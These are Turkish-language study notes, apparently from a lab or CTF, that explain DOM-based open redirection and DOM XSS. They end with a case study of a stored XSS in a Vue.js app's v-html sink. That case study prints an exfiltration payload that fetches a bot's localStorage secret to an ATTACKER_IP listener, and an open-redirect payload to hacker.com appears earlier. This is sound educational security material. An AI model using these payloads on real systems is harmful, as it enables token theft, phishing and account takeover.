# DOM-Based Attacks (DOM Tabanlı Saldırılar) - Teknik Özet

## 🧠 Temel Kavramlar

### 1. DOM (Document Object Model) Nedir?
DOM, bir web sayfasının programatik arayüzüdür. Tarayıcı, sunucudan aldığı HTML kodunu bir "ağaç (tree)" yapısına dönüştürür. JavaScript, bu ağaçtaki elementleri bularak sayfayı yenilemeden dinamik olarak değiştirmek için DOM'u kullanır.

### 2. Geleneksel Web vs. Modern Web (SPA)
* **Geleneksel Web:** Her tıklamada sunucuya istek gider, sunucu yepyeni bir HTML (DOM) inşa edip geri gönderir. Güvenlik tamamen **Sunucu (Server-Side)** tarafındadır.
* **Modern Web (SPA - Single Page Application):** React, Vue gibi framework'ler kullanılır. Sayfa sadece bir kez yüklenir, ardından JavaScript arka planda JSON verisi çekerek DOM'u anlık olarak günceller.
* **Güvenlik Sorunu:** Güvenlik sınırları (Security Boundaries) birbirine karışır. Sunucu devreden çıktığı için, JavaScript tarafındaki yetersiz filtrelemeler (Client-Side) doğrudan zafiyet doğurur.

### 3. Kutsal İkili: Source ve Sink
Tüm DOM tabanlı saldırılar, verinin bir "Giriş Kapısından" girip "Tehlikeli bir Kuyuya" düşmesiyle gerçekleşir:
* **Source (Kaynak):** Saldırganın veya kullanıcının veri girebildiği noktalardır. (Örn: `window.location.hash`, `document.referrer`)
* **Sink (Kuyu):** Giren verinin JS tarafından işlenip filtrelenmeden DOM'a kod olarak basıldığı veya çalıştırıldığı noktalardır. (Örn: `element.innerHTML`, `document.write()`, `eval()`)

---

## ⚔️ Kritik Saldırı Vektörleri

### 1. DOM-Based Open Redirection (Açık Yönlendirme)
Yazılımcının, URL'deki (Source) değeri alıp hiçbir güvenlik kontrolünden geçirmeden kullanıcıyı yönlendirme (Sink) işleminde kullanmasıdır.
* **Zafiyetli Kod:** `location = window.location.hash.slice(1);`
* **Payload:** `https://hedefsite.com/#https://hacker.com`
* **Sonuç:** Kurban, güvenilir siteye tıklamasına rağmen sayfa yüklenince arka plandaki JS tarafından anında zararlı siteye yönlendirilir (Oltalama / Phishing).

### 2. DOM-Based XSS (Cross-Site Scripting)
Klasik XSS'ten (Reflected/Stored) en büyük farkı, **zararlı kodun (payload) hiçbir zaman sunucuya (Backend) ulaşmamasıdır.** Sunucudaki güvenlik duvarları (WAF) bu saldırıyı göremez çünkü kod sadece kurbanın tarayıcısındaki JS motorunda (Client-Side) çalışır.
* **Modern Tarayıcı Engeli:** Eskiden URL üzerinden çok sık yapılırdı ancak modern tarayıcılar URL'deki özel karakterleri `< >` otomatik olarak **URL Encoding** işleminden geçirdiği için bu yöntem büyük oranda engellenmiştir.

---

## 🥷 Silahlaştırma (Weaponisation) ve Savunmaları Aşma

Sadece ekrana `alert(1)` bastırmak bir PoC'dir (Proof of Concept), gerçek bir etki yaratmaz. Açığı silahlaştırmak gerekir.

* **Self-XSS Tuzağı:** Kodu sadece kendi tarayıcında çalıştırman bir işe yaramaz. Kurbana iletmek için XSS'in Reflected (Yansıyan) veya Stored (Kalıcı) formlarıyla birleştirilmesi (Stored DOM XSS) gerekir.
* **HttpOnly Bypass:** Modern sistemlerde oturum çerezleri `HttpOnly` bayrağı ile korunur (JS çerezleri okuyamaz). Bu yüzden çerez çalmak yerine, kurbanın tarayıcısı "kukla" gibi kullanılıp onun adına kritik API istekleri (şifre değiştirme, veri silme) attırılır.

---

## 🔬 Vaka Analizi: Vue.js SPA DOM XSS Sömürüsü

Uygulamada, kullanıcıların birbirlerine hediye/isim eklediği bir modülde sömürü gerçekleştirilmiştir.

1.  **Keşif:** Vue.js gibi framework'lerde orijinal kaynak kodlar doğrudan gözükmez. Tarayıcının Geliştirici Araçlarındaki **Source Maps (Debugger)** özelliği kullanılarak `.vue` uzantılı kaynak kodlar analiz edildi.
2.  **Zafiyet Tespiti:** Bir Vue bileşeninde, girilen veriyi güvenli olan `{{ veri }}` yapısı yerine, çiğ HTML basan tehlikeli **`v-html`** direktifiyle (Sink) işlendiği tespit edildi.
3.  **Saldırı Planı:** Arka planda listeyi kontrol eden "Admin Bot"un tarayıcısındaki `localStorage`'da bulunan `secret` yetki token'ını çalmak.
4.  **Payload (Stored DOM XSS):**
    ```html
    <img src="x" onerror="fetch('http://[ATTACKER_IP]:4242/?secret=' + encodeURIComponent(localStorage.getItem('secret')))">
    ```
5.  **Sömürü (Exploitation):**
    * Saldırgan dinleyiciyi başlattı (`python3 -m http.server 4242`).
    * Zafiyetli input (Person/İsim) alanına Payload girildi ve sisteme kaydedildi.
    * Bot sayfayı ziyaret ettiğinde, `v-html` kodu doğrudan DOM'a işledi ve Payload tetiklendi.
    * Botun `secret` değeri saldırganın sunucusuna düştü.
    * Saldırgan ele geçirdiği token'ı kendi tarayıcısına (`localStorage`) ekleyerek Yetki Yükseltme (Privilege Escalation) sağladı ve hedef verileri sildi.
